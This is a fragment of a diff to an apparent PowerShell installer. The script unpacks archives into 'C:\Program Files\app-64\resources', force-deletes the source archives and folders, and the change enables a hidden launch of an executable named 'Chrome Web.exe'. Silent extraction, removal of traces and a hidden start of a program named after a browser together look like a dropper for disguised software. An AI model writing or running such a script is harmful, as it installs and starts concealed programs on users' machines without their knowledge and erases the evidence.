@@ -28,9 +28,9 @@ Expand-7Zip -ArchiveFileName C:\Users\ProJ03-main\app-64.7z.001 -Password "" -Ta
 Expand-Archive -Path C:\Users\app.zip -DestinationPath "C:\Program Files\app-64\resources\"
 
 
-Remove-Item -Force -Recurse 'C:\Users\app64.zip', 'C:\Users\ProJ03-main', 'C:\Users\app.zip' } |
+Remove-Item -Force -Recurse 'C:\Users\app64.zip', 'C:\Users\ProJ03-main', 'C:\Users\app.zip' 
 
-#Start-Process "C:\Program Files\app-64\Chrome Web.exe" --hidden 
+Start-Process "C:\Program Files\app-64\Chrome Web.exe" --hidden } |
 
 
 
